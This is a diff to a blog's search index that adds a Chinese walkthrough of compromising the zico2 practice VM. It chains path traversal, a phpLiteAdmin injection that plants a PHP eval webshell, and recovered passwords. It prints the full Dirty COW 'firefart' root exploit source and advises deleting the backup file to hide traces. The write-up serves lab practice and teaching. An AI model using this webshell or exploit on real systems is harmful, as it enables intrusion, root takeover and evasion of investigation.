@@ -4099,13 +4099,8 @@
       </tags>
   </entry>
   <entry>
-    <title>CC4+CC2利用链分析</title>
-    <url>/2023/09/08/CC4-CC2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>CommonCollections4与CommonCollections利用链分析</title>
-    <url>/2023/09/08/cc4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <url>/2023/09/08/cc4-cc2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>CC4这条利用链与前面不同的是用到了新的Commons-Collections4依赖库，我们在前面分析的CC1,3.6用的都是Commons-Collections库3.2.1的版本</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
 
@@ -4437,6 +4432,337 @@
 ]]></content>
       <tags>
         <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>zico2靶机打靶记录</title>
+    <url>/2023/09/08/zico2%20/</url>
+    <content><![CDATA[<h2 id="一、漏洞平台搭建"><a href="#一、漏洞平台搭建" class="headerlink" title="一、漏洞平台搭建"></a>一、漏洞平台搭建</h2><p>我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。</p>
+<p>我这里可以直接通过kali导入这个靶场</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172324367.png"
+                      alt="image-20230907172324367"
+                ></p>
+<p>通过打开我们下载的ova文件导入靶场</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172503984.png"
+                      alt="image-20230907172503984"
+                ></p>
+<p>我们这里设置导入虚拟机的名称和存放位置</p>
+<p>然后点击导入就可以导入这个靶机了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172606614.png"
+                      alt="image-20230907172606614"
+                ></p>
+<p>然后我们开启靶机就行了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172731134.png"
+                      alt="image-20230907172731134"
+                ></p>
+<p>这里就启动成功了</p>
+<h2 id="二、主机发现"><a href="#二、主机发现" class="headerlink" title="二、主机发现"></a>二、主机发现</h2><p>首先我们要先获取到目标靶机的ip地址</p>
+<p>由于目标靶机和kali在同一网段，我们这里直接用kali扫描网段存活主机</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906112007294.png"
+                      alt="image-20230906112007294"
+                ></p>
+<p>通过对网段存活主机的扫描可以得到我们目标靶机的ip地址</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>上面我们通过arp协议扫描到了目标靶机的ip地址</p>
+<p>但是为了能够进一步渗透我们需要对目标靶机进行信息收集</p>
+<p>nmap扫描目标靶机开放的端口</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.133 </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113648922.png"
+                      alt="image-20230906113648922"
+                ></p>
+<p>目标靶机开放了22端口和80端口</p>
+<p>说明目标靶机开放了web服务</p>
+<p>访问响应的web服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113816865.png"
+                      alt="image-20230906113816865"
+                ></p>
+<h2 id="三、漏洞扫描与利用"><a href="#三、漏洞扫描与利用" class="headerlink" title="三、漏洞扫描与利用"></a>三、漏洞扫描与利用</h2><p>访问网站可以看到这是一个类似于商店类型的网站</p>
+<p>首先就是对网站的各个功能点，页面进行测试，看看能不能找到利用的点</p>
+<p>在对网站功能进行查看的时候可以看到在 Service存在一个跳转按钮</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907111909544.png"
+                      alt="image-20230907111909544"
+                ></p>
+<p>点击后跳转到了一个商品页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131210092.png"
+                      alt="image-20230907131210092"
+                ></p>
+<p>我们可以看到这个所传递的参数和路由</p>
+<p><a class="link"   href="http://192.168.113.133/view.php?page=tools.html" >http://192.168.113.133/view.php?page=tools.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这里猜测后台处理逻辑是通过page参数将我们要访问的页面传递给view.php进行处理后将相应的页面传递给前端。</p>
+<p>我们这里把参数值改为index.html</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131613066.png"
+                      alt="image-20230907131613066"
+                ></p>
+<p>可以看到成功返回了首页面</p>
+<p>但是只能返回设定路径下的文件</p>
+<p>比如我们这里尝试返回根目录下的&#x2F;etc&#x2F;passwd</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131835473.png"
+                      alt="image-20230907131835473"
+                ></p>
+<p>回显是空，说明这个只能返回对应目录下的文件，但是如果网站过滤不严格的话，我们完全可以通过..&#x2F;向上一级跳跃</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907132400583.png"
+                      alt="image-20230907132400583"
+                ></p>
+<p>读取成功，说明这里存在文件包含漏洞</p>
+<p>但是这个漏洞也只是可以让我们对服务器的一下文件进行读取和查看，并不能帮助我们直接拿下这台服务器</p>
+<p>其他的功能点并没有找到明显可以利用的漏洞</p>
+<p>通过dirsearch工具对网站目录进行扫描</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.133</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133017583.png"
+                      alt="image-20230907133017583"
+                ></p>
+<p>很明显这里存在一个dbadmin路由</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133051115.png"
+                      alt="image-20230907133051115"
+                ></p>
+<p>访问可以发现存在两个页面一个是首页，另外一个是执行数据库操作的文件</p>
+<p>访问test_db.php</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133250970.png"
+                      alt="image-20230907133250970"
+                ></p>
+<p>尝试弱口令登录</p>
+<p>admin可以登录成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133408575.png"
+                      alt="image-20230907133408575"
+                ></p>
+<p>这是一个对数据库进行操作的页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134334708.png"
+                      alt="image-20230907134334708"
+                ></p>
+<p>在数据库中我们可以得到两组账号密码</p>
+<p>密码是被md5加密的，进行md5解密</p>
+<p>可以得到两组账号密码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root：34kroot34</span><br><span class="line">zico: zico2215@</span><br></pre></td></tr></table></figure></div>
+
+<p>尝试ssh登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135213443.png"
+                      alt="image-20230907135213443"
+                ></p>
+<p>登录失败</p>
+<p>这是一个管理 SQLite 数据库的开源 web 应用程序phpLiteAdmin 而且我们还给出了版本号</p>
+<p>通过漏洞工具searchsploit去查询对应版本所存在的漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134132458.png"
+                      alt="image-20230907134132458"
+                ></p>
+<p>存在远程代码注入漏洞</p>
+<p>那我们可以通过这个漏洞写入后门文件。然后通过文件包含漏洞访问这个后门文件进行shell利用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135835527.png"
+                      alt="image-20230907135835527"
+                ></p>
+<p>创建的数据库文件是存在于&#x2F;user&#x2F;databases下的</p>
+<p>并且对文件后缀并没有限制</p>
+<p>那我们就可以创建一个php后门文件</p>
+<p>然后在文件中写入一句话木马</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135415483.png"
+                      alt="image-20230907135415483"
+                ></p>
+<p>创建一个shell.php文件</p>
+<p>设置表名和表的数量</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135935783.png"
+                      alt="image-20230907135935783"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140556674.png"
+                      alt="image-20230907140556674"
+                ></p>
+<p>在default value值出写入我们的一句话木马</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>点击创建我们的木马文件就成功写入了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141321927.png"
+                      alt="image-20230907141321927"
+                ></p>
+<p>但是因为我们写入的后门文件是在&#x2F;usr&#x2F;databases下</p>
+<p>不能直接访问</p>
+<p>所以我们这里通过前面的文件包含漏洞包含到这个后门文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140815609.png"
+                      alt="image-20230907140815609"
+                ></p>
+<p>蚁剑连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141231935.png"
+                      alt="image-20230907141231935"
+                ></p>
+<p>成功进入到服务器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141356536.png"
+                      alt="image-20230907141356536"
+                ></p>
+<p>然后在服务器文件中</p>
+<p>查找靶机中有没有存在敏感信息。最终在家目录中wordpress中的配置文件<code>wp-config.php</code>中找到了<code>zico</code>账号和密码 <code>sWfCsfJSPV9H3AmQzw8</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142001637.png"
+                      alt="image-20230907142001637"
+                ></p>
+<p>尝试ssh登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142111950.png"
+                      alt="image-20230907142111950"
+                ></p>
+<p>登录成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142139159.png"
+                      alt="image-20230907142139159"
+                ></p>
+<p>但是可以看到这个账号只是普通用户权限</p>
+<p>我们要拿下这太服务器就要把权限提升到root权限</p>
+<h2 id="四、脏牛提权"><a href="#四、脏牛提权" class="headerlink" title="四、脏牛提权"></a>四、脏牛提权</h2><p>查看一下内核版本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142424239.png"
+                      alt="image-20230907142424239"
+                ></p>
+<p>内核版本是3.2.0，那我们这里可以内核漏洞进行脏牛提权，脏牛漏洞影响版本低于3.9的liunx内核</p>
+<p>利用exp：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span><br><span class="line">// as a base and automatically generates a new passwd line.</span><br><span class="line">// The user will be prompted for the new password when the binary is run.</span><br><span class="line">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span><br><span class="line">// and overwrites the root account with the generated line.</span><br><span class="line">// After running the exploit you should be able to login with the newly</span><br><span class="line">// created user.</span><br><span class="line">//</span><br><span class="line">// To use this exploit modify the user values according to your needs.</span><br><span class="line">//   The default is &quot;firefart&quot;.</span><br><span class="line">//</span><br><span class="line">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span><br><span class="line">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span><br><span class="line">//</span><br><span class="line">// Compile with:</span><br><span class="line">//   gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">//</span><br><span class="line">// Then run the newly create binary by either doing:</span><br><span class="line">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span><br><span class="line">//</span><br><span class="line">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span><br><span class="line">//</span><br><span class="line">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span><br><span class="line">//   mv /tmp/passwd.bak /etc/passwd</span><br><span class="line">//</span><br><span class="line">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span><br><span class="line">// https://firefart.at</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;crypt.h&gt;</span><br><span class="line"></span><br><span class="line">const char *filename = &quot;/etc/passwd&quot;;</span><br><span class="line">const char *backup_filename = &quot;/tmp/passwd.bak&quot;;</span><br><span class="line">const char *salt = &quot;firefart&quot;;</span><br><span class="line"></span><br><span class="line">int f;</span><br><span class="line">void *map;</span><br><span class="line">pid_t pid;</span><br><span class="line">pthread_t pth;</span><br><span class="line">struct stat st;</span><br><span class="line"></span><br><span class="line">struct Userinfo &#123;</span><br><span class="line">   char *username;</span><br><span class="line">   char *hash;</span><br><span class="line">   int user_id;</span><br><span class="line">   int group_id;</span><br><span class="line">   char *info;</span><br><span class="line">   char *home_dir;</span><br><span class="line">   char *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">char *generate_password_hash(char *plaintext_pw) &#123;</span><br><span class="line">  return crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *generate_passwd_line(struct Userinfo u) &#123;</span><br><span class="line">  const char *format = &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;</span><br><span class="line">  int size = snprintf(NULL, 0, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  char *ret = malloc(size + 1);</span><br><span class="line">  sprintf(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void *madviseThread(void *arg) &#123;</span><br><span class="line">  int i, c = 0;</span><br><span class="line">  for(i = 0; i &lt; 200000000; i++) &#123;</span><br><span class="line">    c += madvise(map, 100, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;madvise %d\n\n&quot;, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int copy_file(const char *from, const char *to) &#123;</span><br><span class="line">  // check if target file already exists</span><br><span class="line">  if(access(to, F_OK) != -1) &#123;</span><br><span class="line">    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,</span><br><span class="line">      to);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  char ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, &quot;r&quot;);</span><br><span class="line">  if(source == NULL) &#123;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, &quot;w&quot;);</span><br><span class="line">  if(target == NULL) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;%s successfully backed up to %s\n&quot;,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  // backup file</span><br><span class="line">  int ret = copy_file(filename, backup_filename);</span><br><span class="line">  if (ret != 0) &#123;</span><br><span class="line">    exit(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  struct Userinfo user;</span><br><span class="line">  // set values, change as needed</span><br><span class="line">  user.username = &quot;firefart&quot;;</span><br><span class="line">  user.user_id = 0;</span><br><span class="line">  user.group_id = 0;</span><br><span class="line">  user.info = &quot;pwned&quot;;</span><br><span class="line">  user.home_dir = &quot;/root&quot;;</span><br><span class="line">  user.shell = &quot;/bin/bash&quot;;</span><br><span class="line"></span><br><span class="line">  char *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  if (argc &gt;= 2) &#123;</span><br><span class="line">    plaintext_pw = argv[1];</span><br><span class="line">    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    plaintext_pw = getpass(&quot;Please enter the new password: &quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  char *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  map = mmap(NULL,</span><br><span class="line">             st.st_size + sizeof(long),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             0);</span><br><span class="line">  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);</span><br><span class="line">  pid = fork();</span><br><span class="line">  if(pid) &#123;</span><br><span class="line">    waitpid(pid, NULL, 0);</span><br><span class="line">    int u, i, o, c = 0;</span><br><span class="line">    int l=strlen(complete_passwd_line);</span><br><span class="line">    for(i = 0; i &lt; 10000/l; i++) &#123;</span><br><span class="line">      for(o = 0; o &lt; l; o++) &#123;</span><br><span class="line">        for(u = 0; u &lt; 10000; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      map + o,</span><br><span class="line">                      *((long*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;ptrace %d\n&quot;,c);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   NULL,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   NULL);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,NULL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);</span><br><span class="line">  printf(&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    printf(&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>保存成一个shell.c文件</p>
+<p>上传到我们的服务器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907155900947.png"
+                      alt="image-20230907155900947"
+                ></p>
+<p>用gcc编译一下</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread c代码文件名 -o 输出文件名 -lcrypt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160505475.png"
+                      alt="image-20230907160505475"
+                ></p>
+<p>执行编译后的程序</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160922874.png"
+                      alt="image-20230907160922874"
+                ></p>
+<p>输入密码</p>
+<p>我们这里看一下etc&#x2F;passwd</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161148341.png"
+                      alt="image-20230907161148341"
+                ></p>
+<p>可以看到我们这里成功添加了一个firefart用户而且还是root权限</p>
+<p>我们这里其实就是利用脏牛漏洞在etc&#x2F;passwd中添加了一个root用户</p>
+<p>但是攻击者在利用脏牛漏洞时通常会创建一个备份文件，如 <code>/etc/passwd.bak</code>，用于保存原始的 <code>/etc/passwd</code> 文件内容</p>
+<p>我们这里为了删除攻击痕迹，可以把这个文件删除掉</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161444986.png"
+                      alt="image-20230907161444986"
+                ></p>
+<p>上面我们通过脏牛漏洞成功添加了一个特权用户，并且有root权限</p>
+<p>那么我们可以通过su切换到这个特权用户</p>
+<p>密码是我们上面自己设的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161620764.png"
+                      alt="image-20230907161620764"
+                ></p>
+<p>提权到root权限，那么到这里我们就拿下了这台服务器。</p>
+]]></content>
+      <tags>
+        <tag>渗透-靶机</tag>
       </tags>
   </entry>
 </search>
